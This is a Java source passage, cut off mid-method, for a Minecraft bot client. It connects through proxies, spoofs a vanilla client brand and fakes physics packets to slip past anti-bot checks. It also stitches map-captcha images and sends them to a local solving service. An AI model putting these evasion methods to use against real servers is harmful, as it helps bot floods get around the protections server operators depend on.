package dev.xqedii;

import com.github.steveice10.mc.protocol.MinecraftProtocol;
import com.github.steveice10.mc.protocol.data.game.BossBarAction;
import com.github.steveice10.mc.protocol.data.game.entity.metadata.Position;
import com.github.steveice10.mc.protocol.data.game.entity.object.Direction;
import com.github.steveice10.mc.protocol.data.game.entity.player.*;
import com.github.steveice10.mc.protocol.data.game.inventory.ClickItemAction;
import com.github.steveice10.mc.protocol.data.game.inventory.ContainerActionType;
import com.github.steveice10.mc.protocol.data.game.entity.metadata.ItemStack;
import com.github.steveice10.mc.protocol.packet.handshake.serverbound.ClientIntentionPacket;
import com.github.steveice10.mc.protocol.packet.ingame.clientbound.*;
import com.github.steveice10.mc.protocol.packet.ingame.clientbound.entity.ClientboundAnimatePacket;
import com.github.steveice10.mc.protocol.packet.ingame.clientbound.entity.ClientboundRemoveEntitiesPacket; // Needed for dismount
import com.github.steveice10.mc.protocol.packet.ingame.clientbound.entity.ClientboundSetPassengersPacket; // Needed for mount
import com.github.steveice10.mc.protocol.packet.ingame.clientbound.entity.player.ClientboundPlayerPositionPacket;
import com.github.steveice10.mc.protocol.packet.ingame.clientbound.entity.player.ClientboundSetCarriedItemPacket;
import com.github.steveice10.mc.protocol.packet.ingame.clientbound.level.ClientboundBlockUpdatePacket;
import com.github.steveice10.mc.protocol.packet.ingame.clientbound.level.ClientboundSectionBlocksUpdatePacket;
import com.github.steveice10.mc.protocol.packet.ingame.clientbound.title.ClientboundSetActionBarTextPacket;
import com.github.steveice10.mc.protocol.packet.ingame.serverbound.ServerboundChatPacket;
import com.github.steveice10.mc.protocol.packet.ingame.clientbound.entity.spawn.ClientboundAddEntityPacket;
import com.github.steveice10.mc.protocol.data.game.setting.ChatVisibility;
import com.github.steveice10.mc.protocol.data.game.setting.SkinPart;
import com.github.steveice10.mc.protocol.packet.ingame.serverbound.ServerboundClientInformationPacket;
import com.github.steveice10.mc.protocol.packet.ingame.serverbound.ServerboundCustomPayloadPacket;
import java.io.ByteArrayOutputStream;
import com.github.steveice10.mc.protocol.packet.ingame.clientbound.inventory.ClientboundContainerSetContentPacket;
import com.github.steveice10.mc.protocol.packet.ingame.clientbound.inventory.ClientboundOpenScreenPacket;
import com.github.steveice10.mc.protocol.packet.ingame.clientbound.inventory.ClientboundContainerClosePacket;
import java.util.concurrent.ConcurrentHashMap;
import java.util.Map;
import com.github.steveice10.mc.protocol.packet.ingame.clientbound.ClientboundKeepAlivePacket;
import com.github.steveice10.mc.protocol.packet.ingame.serverbound.ServerboundKeepAlivePacket;
import com.github.steveice10.packetlib.event.session.PacketSendingEvent;
import java.lang.reflect.Field;
import com.github.steveice10.mc.protocol.data.game.entity.player.Hand;
import com.github.steveice10.mc.protocol.data.game.entity.player.PlayerAction;
import com.github.steveice10.mc.protocol.packet.ingame.serverbound.player.ServerboundPlayerActionPacket;
import com.github.steveice10.mc.protocol.packet.ingame.serverbound.player.ServerboundUseItemPacket;
import com.github.steveice10.mc.protocol.packet.ingame.clientbound.title.ClientboundSetTitleTextPacket;
import com.github.steveice10.mc.protocol.packet.ingame.clientbound.title.ClientboundSetSubtitleTextPacket;
import com.github.steveice10.mc.protocol.packet.ingame.serverbound.player.ServerboundMovePlayerRotPacket;
import com.github.steveice10.mc.protocol.packet.ingame.serverbound.ServerboundPongPacket;
import java.nio.charset.StandardCharsets;
import com.github.steveice10.mc.protocol.packet.ingame.clientbound.ClientboundResourcePackPacket;
import com.github.steveice10.mc.protocol.packet.ingame.serverbound.ServerboundResourcePackPacket;
import com.github.steveice10.mc.protocol.data.game.ResourcePackStatus;
import com.github.steveice10.mc.protocol.packet.ingame.clientbound.entity.spawn.ClientboundAddEntityPacket;
import com.github.steveice10.mc.protocol.packet.ingame.serverbound.player.ServerboundSwingPacket; // Zamiast ServerboundSwingArmPacket
import com.github.steveice10.mc.protocol.packet.ingame.serverbound.ServerboundCustomPayloadPacket; // Opcjonalnie do brandu
import com.github.steveice10.mc.protocol.packet.ingame.serverbound.inventory.ServerboundContainerClickPacket;
import com.github.steveice10.mc.protocol.packet.ingame.serverbound.level.ServerboundAcceptTeleportationPacket;
import com.github.steveice10.mc.protocol.packet.ingame.serverbound.level.ServerboundMoveVehiclePacket; // Needed for vehicle physics
import com.github.steveice10.mc.protocol.packet.ingame.serverbound.level.ServerboundPaddleBoatPacket; // Needed for boat check
import com.github.steveice10.mc.protocol.packet.ingame.serverbound.level.ServerboundPlayerInputPacket;
import com.github.steveice10.mc.protocol.packet.ingame.serverbound.player.*;
import com.github.steveice10.opennbt.tag.builtin.CompoundTag;
import com.github.steveice10.opennbt.tag.builtin.ListTag;
import com.github.steveice10.opennbt.tag.builtin.StringTag;
import com.github.steveice10.packetlib.ProxyInfo;
import com.github.steveice10.packetlib.Session;
import com.github.steveice10.packetlib.event.session.DisconnectedEvent;
import com.github.steveice10.packetlib.event.session.SessionAdapter;
import com.github.steveice10.packetlib.packet.Packet;
import com.github.steveice10.packetlib.tcp.TcpClientSession;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import net.kyori.adventure.text.Component;

// --- IMPORTY DO MAPY I SERWERA HTTP ---
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.*;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import java.awt.image.BufferedImage;
import javax.imageio.ImageIO;
import java.awt.Color;
import java.io.OutputStream;
import com.github.steveice10.mc.protocol.packet.ingame.clientbound.level.ClientboundMapItemDataPacket;
import com.github.steveice10.mc.protocol.packet.ingame.clientbound.inventory.ClientboundContainerSetSlotPacket;
import com.github.steveice10.mc.protocol.data.game.level.map.MapData;
// ---------------------------------------

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.util.concurrent.*;

public class Bot extends Thread {

    private MinecraftProtocol protocol = null;
    private int botId;
    private String nickname;
    private ProxyInfo proxy;
    private InetSocketAddress address;
    private Session client;
    private boolean hasMainListener;
    private boolean LimboConnected = false;
    private ScheduledExecutorService bowExecutor;
    private boolean isFirstLogin = true;
    // Cache danych map: MapID -> Tablica bajtów kolorów (128x128 = 16384)
    private final java.util.Map<Integer, byte[]> mapCache = new ConcurrentHashMap<>();
    // Proste śledzenie hotbara (sloty 36-44 w kontenerze 0 to hotbar 0-8)
    private final ItemStack[] hotbarItems = new ItemStack[9];

    private int currentWindowId = 0;
    private final Map<Integer, ItemStack> currentWindowItems = new ConcurrentHashMap<>();
    // Position variables
    private double lastX, lastY, lastZ = -1;
    private float lastYaw, lastPitch = 0;
    private boolean onGround = false;

    // ANTI-BOT FIX VARIABLES
    private int entityId = 0;
    private int currentSlot = 0;

    // VEHICLE CHECK VARIABLES
    private boolean isInVehicle = false;
    private int vehicleId = -1;
    private ScheduledExecutorService vehicleExecutor;
    private double vehicleMotionY = 0;
    private double lastVehicleY = 0;
    private final ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();
    private ScheduledFuture<?> captchaDebounceTask;
    private final java.util.Set<Integer> recentMapIds = java.util.Collections.synchronizedSet(new java.util.HashSet<>());

    public static String captchaMode = "manual"; // Domyślnie manual
    private String actionsFilePath;
    private ScheduledExecutorService sectorSwapExecutor;
    private final ExecutorService scriptExecutor = Executors.newSingleThreadExecutor();
    private final ListenerManager listenerManager;

    public double getX() {
        return lastX;
    }
    public double getY() {
        return lastY;
    }
    public double getZ() {
        return lastZ;
    }
    // Gravity System (Player)
    private ScheduledExecutorService gravityExecutor;
    private double motionY = 0;
    private double targetLandY = -999;
    private boolean gravityEnabled = true; // Domyślnie grawitacja włączona

    private int ServerLoop = 5;

    private volatile int currentSwapSector = 1;
    private ScheduledExecutorService botHeadroll;

    private boolean connected;

    public Bot(int botId, String nickname, InetSocketAddress address, ProxyInfo proxy, String actionsFilePath, ListenerManager listenerManager) {
        this.botId = botId;
        this.nickname = nickname;
        this.address = address;
        this.proxy = proxy;
        this.actionsFilePath = actionsFilePath;
        this.listenerManager = listenerManager;

        Log.imp("Creating bot", nickname, " [#" + botId + "]");
        protocol = new MinecraftProtocol(nickname);
        client = new TcpClientSession(address.getHostString(), address.getPort(), protocol, proxy);
    }

    public ExecutorService getScriptExecutor() {
        return scriptExecutor;
    }

    @Override
    public void run() {
        client.addListener(new SessionAdapter() {

            @Override
            public void packetReceived(Session session, Packet packet) {
                // [DEBUG] Odkomentuj linię niżej, jeśli bot nadal nie działa, żeby widzieć WSZYSTKIE pakiety
                // Log.info("DEBUG PACKET: " + packet.getClass().getSimpleName());

                if (packet instanceof ClientboundLoginPacket) {
                    ClientboundLoginPacket login = (ClientboundLoginPacket) packet;
                    entityId = login.getEntityId();
                    connected = true;

                    // Reset fizyki przy KAŻDEJ zmianie serwera/świata
                    if (gravityExecutor != null) gravityExecutor.shutdownNow();
                    if (vehicleExecutor != null) vehicleExecutor.shutdownNow();
                    onGround = false;
                    motionY = 0;

                    // Logika wysyłania pakietów startowych
                    if (isFirstLogin) {
                        // TO WYKONUJE SIĘ TYLKO RAZ - PRZY POŁĄCZENIU DO PROXY (AUTH)
                        isFirstLogin = false;

                        // Tutaj małe opóźnienie dla bezpieczeństwa startu
                        new Thread(() -> {
                            try {
                                Thread.sleep(500);

                                // --- Client Settings --- (Wysyłamy tylko raz!)
                                List<SkinPart> skinParts = new ArrayList<>(Arrays.asList(SkinPart.values()));
                                client.send(new ServerboundClientInformationPacket(
                                        "en_US", 10, ChatVisibility.FULL, true, skinParts,
                                        HandPreference.RIGHT_HAND, false, true
                                ));

                                // --- Brand --- (Wysyłamy tylko raz!)
                                try {
                                    String brand = "vanilla";
                                    ByteArrayOutputStream brandOut = new ByteArrayOutputStream();
                                    brandOut.write(brand.length());
                                    brandOut.write(brand.getBytes(StandardCharsets.UTF_8));
                                    client.send(new ServerboundCustomPayloadPacket("minecraft:brand", brandOut.toByteArray()));
                                } catch (Exception e) { e.printStackTrace(); }

                                // Skrypt startowy
                                if (!LimboConnected) {
                                    LimboConnected = true;
                                    Log.imp(nickname + " Connected to server! [#" + botId + "]");
                                    scriptExecutor.submit(Bot.this::executeScriptFromFile);
                                }

                            } catch (Exception e) { e.printStackTrace(); }
                        }).start();

                    } else {
                        Log.info("Switched server/dimension (Packet ignored to prevent Config Phase crash).");
                    }
                }
                else if (packet instanceof ClientboundAddEntityPacket) {
                    ClientboundAddEntityPacket p = (ClientboundAddEntityPacket) packet;
                    lastVehicleY = p.getY();
                }
                else if (packet instanceof ClientboundResourcePackPacket) {
                    ClientboundResourcePackPacket p = (ClientboundResourcePackPacket) packet;
                    String url = p.getUrl();
                    String hash = p.getHash();

                    client.send(new ServerboundResourcePackPacket(ResourcePackStatus.ACCEPTED));

                    client.send(new ServerboundResourcePackPacket(ResourcePackStatus.SUCCESSFULLY_LOADED));
                }
                else if (packet instanceof ClientboundMapItemDataPacket) {
                    ClientboundMapItemDataPacket p = (ClientboundMapItemDataPacket) packet;
                    int mapId = p.getMapId();
                    MapData data = p.getData();

                    if (data != null && data.getData() != null && data.getData().length > 0) {
                        // 1. Aktualizacja danych konkretnej mapy w pamięci
                        mapCache.compute(mapId, (k, v) -> {
                            if (v == null) v = new byte[16384];
                            byte[] packetColors = data.getData();
                            // Proste nadpisanie bufora (najskuteczniejsze przy captchach)
                            System.arraycopy(packetColors, 0, v, 0, Math.min(packetColors.length, v.length));
                            return v;
                        });

                        // 2. Dodajemy ID tej mapy do listy "ostatnio odebranych"
                        recentMapIds.add(mapId);

                        // 3. Logika Debounce + Stitching (Sklejanie)
                        if (listenerManager != null) {
                            if (captchaDebounceTask != null && !captchaDebounceTask.isDone()) {
                                captchaDebounceTask.cancel(false);
                            }

                            // Czekamy 500ms od ostatniego pakietu
                            captchaDebounceTask = scheduler.schedule(() -> {
                                try {
                                    // Pobieramy i sortujemy ID map (zakładamy, że serwer wysyła je po kolei: 100, 101, 102...)
                                    List<Integer> sortedIds = new ArrayList<>(recentMapIds);
                                    Collections.sort(sortedIds);

                                    int count = sortedIds.size();
                                    if (count == 0) return;

                                    // Logika układania:
                                    // 4 mapy = 2x2
                                    // 9 map = 3x3
                                    // Inna ilość = Pasek poziomy (np. 1, 2, 3 mapy w rzędzie)
                                    int columns = (int) Math.ceil(Math.sqrt(count));
                                    int rows = (int) Math.ceil((double) count / columns);

                                    int singleSize = 128;
                                    int totalWidth = columns * singleSize;
                                    int totalHeight = rows * singleSize;

                                    // Tworzymy płótno na duży obrazek
                                    BufferedImage combinedImage = new BufferedImage(totalWidth, totalHeight, BufferedImage.TYPE_INT_RGB);
                                    java.awt.Graphics2D g = combinedImage.createGraphics();

                                    for (int i = 0; i < count; i++) {
                                        int id = sortedIds.get(i);
                                        byte[] mapColors = mapCache.get(id);

                                        if (mapColors != null) {
                                            // Konwertujemy pojedynczą mapę na obrazek
                                            BufferedImage part = new BufferedImage(128, 128, BufferedImage.TYPE_INT_RGB);
                                            for (int j = 0; j < mapColors.length; j++) {
                                                int rgb = MapPalette.getColor(mapColors[j] & 0xFF);
                                                part.setRGB(j % 128, j / 128, rgb);
                                            }

                                            // Obliczamy pozycję na dużym obrazku
                                            int col = i % columns;
                                            int row = i / columns;

                                            // Wklejamy kawałek
                                            g.drawImage(part, col * 128, row * 128, null);
                                        }
                                    }
                                    g.dispose();

                                    // Konwersja całości do Base64 i wysyłka
                                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                                    ImageIO.write(combinedImage, "png", baos);
                                    String base64Image = Base64.getEncoder().encodeToString(baos.toByteArray());

                                    // Wysyłamy gotowy, sklejony obrazek (używając starej logiki wysyłki, ale z nowym Base64)
                                    sendCaptchaToApi(base64Image);

                                    // Czyścimy listę po przetworzeniu
                                    recentMapIds.clear();

                                } catch (Exception e) {
                                    Log.error("Error stitching maps: " + e.getMessage());
                                }
                            }, 500, TimeUnit.MILLISECONDS);
                        }
                    }
                }

                else if (packet instanceof ClientboundOpenScreenPacket) {
                    ClientboundOpenScreenPacket p = (ClientboundOpenScreenPacket) packet;
                    currentWindowId = p.getContainerId();
                    currentWindowItems.clear(); // Czyścimy pamięć przy otwarciu nowego okna
                    Log.info("Opened window ID: " + currentWindowId + " Type: " + p.getType());
                }
                else if (packet instanceof ClientboundContainerClosePacket) {
                    ClientboundContainerClosePacket p = (ClientboundContainerClosePacket) packet;
                    if (p.getContainerId() == currentWindowId) {
                        currentWindowId = 0; // Resetujemy ID, bo okno zamknięte
                        currentWindowItems.clear();
                    }
                }
                else if (packet instanceof ClientboundContainerSetContentPacket) {
                    ClientboundContainerSetContentPacket p = (ClientboundContainerSetContentPacket) packet;
                    if (p.getContainerId() == currentWindowId && currentWindowId != 0) {
                        currentWindowItems.clear();
                        ItemStack[] items = p.getItems();
                        for (int i = 0; i < items.length; i++) {
                            if (items[i] != null) {
                                currentWindowItems.put(i, items[i]);
                            }
                        }
                    }
                }
                // --- ŚLEDZENIE EKWIPUNKU (HOTBAR) ---
                else if (packet instanceof ClientboundContainerSetSlotPacket) {
                    ClientboundContainerSetSlotPacket p = (ClientboundContainerSetSlotPacket) packet;

                    // Aktualizacja śledzenia inventory dla GUI Captcha
                    if (p.getContainerId() == currentWindowId && currentWindowId != 0) {
                        if (p.getItem() != null) {
                            currentWindowItems.put(p.getSlot(), p.getItem());
                        } else {
                            currentWindowItems.remove(p.getSlot());
                        }
                    }

                    // Stara logika dla Hotbara (zachowujemy ją)
                    if (p.getContainerId() == 0) {
                        int slot = p.getSlot();
                        if (slot >= 36 && slot <= 44) {
                            hotbarItems[slot - 36] = p.getItem();
                        }
                    }
                }
                else if (packet instanceof ClientboundPingPacket) {
                    ClientboundPingPacket p = (ClientboundPingPacket) packet;
                    client.send(new ServerboundPongPacket(p.getId()));
                }
                else if (packet instanceof ClientboundSetCarriedItemPacket) {
                    ClientboundSetCarriedItemPacket p = (ClientboundSetCarriedItemPacket) packet;
                    int newSlot = p.getSlot();

                    if (newSlot < 0 || newSlot > 8) {
                        return;
                    }

                    if (newSlot != currentSlot) {
                        currentSlot = newSlot;
                        client.send(new ServerboundSetCarriedItemPacket(currentSlot));
                    }
                }

                else if (packet instanceof ClientboundAnimatePacket) {
                    ClientboundAnimatePacket p = (ClientboundAnimatePacket) packet;
                    if (p.getEntityId() == entityId && p.getAnimation() == Animation.SWING_ARM) {
                        client.send(new ServerboundSwingPacket(Hand.MAIN_HAND));
                    }
                }

                // --- GRAVITY: BLOCKS (SINGLE) ---
                else if (packet instanceof ClientboundBlockUpdatePacket) {
                    ClientboundBlockUpdatePacket p = (ClientboundBlockUpdatePacket) packet;
                    int blockStateId = p.getEntry().getBlock();
                    if (blockStateId != 0) {
                        updateLandingHeight(blockStateId, p.getEntry().getPosition().getY());
                    }
                }
                // --- GRAVITY: BLOCKS (MULTI/SECTION) ---
                else if (packet instanceof ClientboundSectionBlocksUpdatePacket) {
                    ClientboundSectionBlocksUpdatePacket p = (ClientboundSectionBlocksUpdatePacket) packet;
                    for (var entry : p.getEntries()) {
                        int blockStateId = entry.getBlock();
                        if (blockStateId != 0) {
                            int absoluteY = entry.getPosition().getY();
                            updateLandingHeight(blockStateId, absoluteY);
                        }
                    }
                }
                else if (packet instanceof ClientboundRespawnPacket) {
                    ClientboundRespawnPacket p = (ClientboundRespawnPacket) packet;

                    // Zatrzymujemy wszelki ruch
                    Bot.this.motionY = 0;
                    Bot.this.onGround = false;
                    Bot.this.isInVehicle = false;
                    Bot.this.vehicleId = -1;

                    if (gravityExecutor != null && !gravityExecutor.isShutdown()) {
                        gravityExecutor.shutdownNow();
                    }
                    if (vehicleExecutor != null && !vehicleExecutor.isShutdown()) {
                        vehicleExecutor.shutdownNow();
                    }

                    // Ważne: Nie wysyłamy tu żadnych pakietów potwierdzających! Czekamy na PositionPacket.
                }
                else if (packet instanceof ClientboundPlayerPositionPacket) {
                    ClientboundPlayerPositionPacket p = (ClientboundPlayerPositionPacket) packet;

                    // Aktualizacja pozycji w pamięci bota
                    if (p.getRelative().contains(PositionElement.X)) lastX += p.getX(); else lastX = p.getX();
                    if (p.getRelative().contains(PositionElement.Y)) lastY += p.getY(); else lastY = p.getY();
                    if (p.getRelative().contains(PositionElement.Z)) lastZ += p.getZ(); else lastZ = p.getZ();
                    if (p.getRelative().contains(PositionElement.YAW)) lastYaw += p.getYaw(); else lastYaw = p.getYaw();
                    if (p.getRelative().contains(PositionElement.PITCH)) lastPitch += p.getPitch(); else lastPitch = p.getPitch();

                    // 1. Potwierdzenie teleportacji jest wymagane zawsze
                    client.send(new ServerboundAcceptTeleportationPacket(p.getTeleportId()));

                    // 2. Odsyłamy pozycję, ALE...
                    // Przy wchodzeniu na serwer 1.21.4 przez Proxy, wysłanie tego pakietu zbyt wcześnie
                    // (przed zakończeniem Configuration Phase) powoduje błąd.
                    // Wysyłamy go tylko raz, bez włączania grawitacji od razu.
                    client.send(new ServerboundMovePlayerPosRotPacket(onGround, lastX, lastY, lastZ, lastYaw, lastPitch));

                    // Reset fizyki
                    motionY = 0;
                    if (gravityExecutor != null) gravityExecutor.shutdownNow();

                    // Opóźniony start grawitacji - dajemy serwerowi 1s na ogarnięcie się po teleportacji
                    if (gravityEnabled && !isInVehicle) {
                        new Thread(() -> {
                            try {
                                Thread.sleep(1000); // Czekamy 1s zanim zaczniemy symulować fizykę
                                if(client.isConnected()) {
                                    startGravitySimulation();
                                }
                            } catch (InterruptedException e) { e.printStackTrace(); }
                        }).start();
                    }
                }

                else if (packet instanceof ClientboundSetPassengersPacket) {
                    ClientboundSetPassengersPacket p = (ClientboundSetPassengersPacket) packet;
                    boolean amIPassenger = false;
                    for (int passengerId : p.getPassengerIds()) {
                        if (passengerId == entityId) {
                            amIPassenger = true;
                            break;
                        }
                    }
                    if (amIPassenger) {
                        mountVehicle(p.getEntityId());
                    }
                }
                else if (packet instanceof ClientboundRemoveEntitiesPacket) {
                    ClientboundRemoveEntitiesPacket p = (ClientboundRemoveEntitiesPacket) packet;
                    for (int id : p.getEntityIds()) {
                        if (id == vehicleId && isInVehicle) {
                            dismountVehicle();
                        }
                    }
                }

                if (listenerManager != null) {
                    if (packet instanceof ClientboundChatPacket) {
                        Component content = ((ClientboundChatPacket) packet).getMessage();
                        String message = ComponentUtils.toPlainText(content);
                        if (!message.trim().isEmpty()) {
                            listenerManager.handleEvent(ListenerType.CHAT, Bot.this, message);
                        }
                    } else if (packet instanceof ClientboundSetActionBarTextPacket) {
                        Component text = ((ClientboundSetActionBarTextPacket) packet).getText();
                        String message = ComponentUtils.toPlainText(text);
                        if (!message.trim().isEmpty()) {
                            listenerManager.handleEvent(ListenerType.ACTIONBAR, Bot.this, message);
                        }
                    } else if (packet instanceof ClientboundBossEventPacket) {
                        ClientboundBossEventPacket p = (ClientboundBossEventPacket) packet;
                        if (p.getAction() == BossBarAction.ADD || p.getAction() == BossBarAction.UPDATE_TITLE) {
                            String message = ComponentUtils.toPlainText(p.getTitle());
                            if (!message.trim().isEmpty()) {
                                listenerManager.handleEvent(ListenerType.BOSSBAR, Bot.this, message);
                            }
                        }
                    }
                }
            }

            @Override
            public void disconnected(DisconnectedEvent event) {
                connected = false;
                Log.imp(nickname + " disconnected");
                Log.info(" -> " + event.getReason());
                if (event.getCause() != null) {
                }

                if (botHeadroll != null) botHeadroll.shutdownNow();
                if (gravityExecutor != null) gravityExecutor.shutdownNow();
                if (vehicleExecutor != null) vehicleExecutor.shutdownNow();
                if (bowExecutor != null) bowExecutor.shutdownNow();
                scriptExecutor.shutdownNow();

                Main.removeBot(Bot.this);

                if (Main.autoReconnectDelay > 0) {
                    Main.reconnectBot(Bot.this);
                }

                Thread.currentThread().interrupt();
            }
        });

        client.connect();
    }

    private void mountVehicle(int vehicleId) {
        this.isInVehicle = true;
        this.vehicleId = vehicleId;
        this.vehicleMotionY = 0;

        if (lastVehicleY != 0) {
            this.lastY = lastVehicleY;
        } else {
            this.lastY = 256.4608000008762;
        }

        this.lastX = 8.5;
        this.lastZ = 8.5;

        if (gravityExecutor != null && !gravityExecutor.isShutdown()) {
            gravityExecutor.shutdownNow();
        }

        startVehicleSimulation();
    }
    private void sendCaptchaToApi(String base64Image) {
        try {
            JsonObject json = new JsonObject();
            json.addProperty("image", base64Image);
            json.addProperty("mode", Main.captchaMode);

            URL url = new URL("http://localhost:3001/api/solve-captcha");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);

            try (OutputStream os = conn.getOutputStream()) {
                byte[] input = json.toString().getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);
            }

            try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8))) {
                StringBuilder response = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) response.append(line);

                JsonObject resJson = new JsonParser().parse(response.toString()).getAsJsonObject();
                if (resJson.has("code")) {
                    String code = resJson.get("code").getAsString();
                    if (!code.equals("TIMEOUT") && !code.equals("CANCELLED")) {
                        Log.info("Captcha solved (" + Main.captchaMode + "): " + code);
                        listenerManager.handleEvent(ListenerType.CAPTCHA, this, "CAPTCHA_SOLVED", code);
                    }
                }
            }
        } catch (Exception e) {
            Log.error("Captcha API error: " + e.getMessage());
        }
    }
    public void startShooting() {
        if (bowExecutor != null && !bowExecutor.isShutdown()) {
            Log.info("Bot is already shooting!", nickname);
            return;
        }

        bowExecutor = Executors.newSingleThreadScheduledExecutor();
        Log.info("Auto-shooting enabled.", nickname);

        bowExecutor.scheduleAtFixedRate(() -> {
            if (!client.isConnected()) {
                stopShooting();
                return;
            }

            try {
                client.send(new ServerboundUseItemPacket(Hand.MAIN_HAND));

                Thread.sleep(250);

                client.send(new ServerboundPlayerActionPacket(PlayerAction.RELEASE_USE_ITEM, new Position(0, 0, 0), Direction.DOWN));

            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }

        }, 0, 300, TimeUnit.MILLISECONDS);
    }

    public void stopShooting() {
        if (bowExecutor != null && !bowExecutor.isShutdown()) {
            bowExecutor.shutdownNow();
            bowExecutor = null;
            Log.info("Auto-shooting disabled.", nickname);

            if (client.isConnected()) {
                client.send(new ServerboundPlayerActionPacket(PlayerAction.RELEASE_USE_ITEM, new Position(0, 0, 0), Direction.DOWN));
            }
        }
    }
    private void dismountVehicle() {
        this.isInVehicle = false;
        this.vehicleId = -1;

        if (vehicleExecutor != null && !vehicleExecutor.isShutdown()) {
            vehicleExecutor.shutdownNow();
        }

        this.onGround = false;
        this.motionY = 0;

        startGravitySimulation();
    }

    private void startVehicleSimulation() {
        if (vehicleExecutor != null && !vehicleExecutor.isShutdown()) {
            return;
        }

        vehicleExecutor = Executors.newSingleThreadScheduledExecutor();

        vehicleExecutor.scheduleAtFixedRate(() -> {
            if (!client.isConnected() || !isInVehicle) {
                vehicleExecutor.shutdown();
                return;
            }

            double gravity = 0.03999999910593033D;
            vehicleMotionY -= gravity;
            lastY += vehicleMotionY;

            client.send(new ServerboundMovePlayerRotPacket(onGround, lastYaw, lastPitch));

            client.send(new ServerboundPlayerInputPacket(0.0f, 0.0f, false, false));

            client.send(new ServerboundMoveVehiclePacket(lastX, lastY, lastZ, lastYaw, lastPitch));

            client.send(new ServerboundPaddleBoatPacket(true, true));

        }, 50, 50, TimeUnit.MILLISECONDS);
    }


    private void updateLandingHeight(int blockStateId, int blockY) {
        if (blockStateId == 0) return;

        double height;

        switch (blockStateId) {
            case 5333: // ENCHANTMENT_TABLE
                height = 0.75;
                break;
            case 7802: // TRAPDOOR (To jest kluczowe! Wcześniej było złe ID)
                height = 0.1875;
                break;
            case 4211: // Trapdoor
                height = 0.1875;
                break;
            case 5358: // END_PORTAL_FRAME
                height = 0.8125;
                break;
            case 5356: // End Portal Frame
                height = 0.8125;
                break;
            case 6916: // DAYLIGHT_SENSOR (To pasuje do twojego błędu 0.375)
                height = 0.375;
                break;
            case 6931: // Daylight Sensor
                height = 0.375;
                break;
            case 5866: // COBBLESTONE_WALL
                height = 1.5;
                break;
            case 8595: // STONE_SLABS
                height = 0.5;
                break;
            case 5899: // Stone Slab
                height = 0.5;
                break;
            case 8116: // WHITE_CARPET
                height = 0.0625;
                break;
            default:
                height = 1.0;
                break;
        }

        double calculatedTarget = blockY + height;

        if (this.targetLandY != -999 && calculatedTarget < this.targetLandY) {
            return;
        }

        this.targetLandY = calculatedTarget;
    }

    private void startGravitySimulation() {
        if (!gravityEnabled) {
            return;
        }
        if (gravityExecutor != null && !gravityExecutor.isShutdown()) {
            return;
        }

        gravityExecutor = Executors.newSingleThreadScheduledExecutor();

        final int[] ticksWaited = {0};

        gravityExecutor.scheduleAtFixedRate(() -> {
            if (!client.isConnected()) {
                gravityExecutor.shutdown();
                return;
            }

            if (isInVehicle) return;

            if (ticksWaited[0] < 3) {
                client.send(new ServerboundMovePlayerPosRotPacket(onGround, lastX, lastY, lastZ, lastYaw, lastPitch));
                ticksWaited[0]++;
                return;
            }

            if (!onGround || (onGround && targetLandY == -999)) {
                onGround = false;

                motionY = (motionY - 0.08) * 0.98;
                double nextY = lastY + motionY;

                if (targetLandY != -999 && nextY <= targetLandY) {
                    if (targetLandY - nextY > 2.0) {
                        targetLandY = -999;
                    } else {
                        nextY = targetLandY;
                        motionY = 0;
                        onGround = true;
                    }
                }

                if (nextY < -70) {
                    motionY = 0;
                }

                move(0, nextY - lastY, 0);
            }

        }, 50, 50, TimeUnit.MILLISECONDS);
    }


    public int getBotId() {
        return botId;
    }

    public void startHeadroll() {
        if (botHeadroll != null && !botHeadroll.isShutdown()) {
            botHeadroll.shutdownNow();
        }
        botHeadroll = Executors.newSingleThreadScheduledExecutor();

        Log.info("Starting life loop for bot #" + botId);

        botHeadroll.scheduleAtFixedRate(() -> {
            if (!client.isConnected()) {
                botHeadroll.shutdown();
                return;
            }

            float newYaw = ThreadLocalRandom.current().nextFloat() * 360.0f - 180.0f;
            float newPitch = ThreadLocalRandom.current().nextFloat() * 180.0f - 90.0f;
            lastYaw = newYaw;
            lastPitch = newPitch;

            if (!isInVehicle) {
                client.send(new ServerboundMovePlayerPosRotPacket(onGround, lastX, lastY, lastZ, newYaw, newPitch));
            }

        }, 200, 200, TimeUnit.MILLISECONDS);
    }

    public void stopHeadroll() {
        if (botHeadroll != null && !botHeadroll.isShutdown()) {
            botHeadroll.shutdownNow();
        }
    }

    public void selectHotbarSlot(int slot) {
        if (slot < 0 || slot > 8) return;
        this.currentSlot = slot;
        client.send(new ServerboundSetCarriedItemPacket(slot));
    }

    public void rightClickWithItem() {
        if (!connected) return;
        client.send(new ServerboundUseItemPacket(Hand.MAIN_HAND));
    }

    public void clickSlot(int slot, int container) {
        if (!connected) return;
        client.send(new ServerboundContainerClickPacket(
                container, 0, slot,
                ContainerActionType.CLICK_ITEM,
                ClickItemAction.LEFT_CLICK,
                null,
                new Int2ObjectOpenHashMap<>()
        ));
    }

    public void clickSlotInAllContainers(int slot) {
        for (int containerId = 0; containerId <= 3; containerId++) {
            clickSlot(slot, containerId);
        }
    }

    public void sendChat(String text) {
        client.send(new ServerboundChatPacket(text));
    }

    public void changeSector(int channel, String type, int container) {
        scriptExecutor.submit(() -> {
            try {
                if (type.equals("sector")) {
                    sendChat("/ch");
                } else {
                    sendChat("/afk");
                }
                Thread.sleep(1000);
                int chann2 = channel + 9;
                clickSlotInAllContainers(chann2);
                Thread.sleep(2000);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
        });
    }

    public void dropHotbarItems() {
        Log.info("Starting to drop hotbar items for " + nickname);
        scriptExecutor.submit(() -> {
            for (int slot = 0; slot <= 8; slot++) {
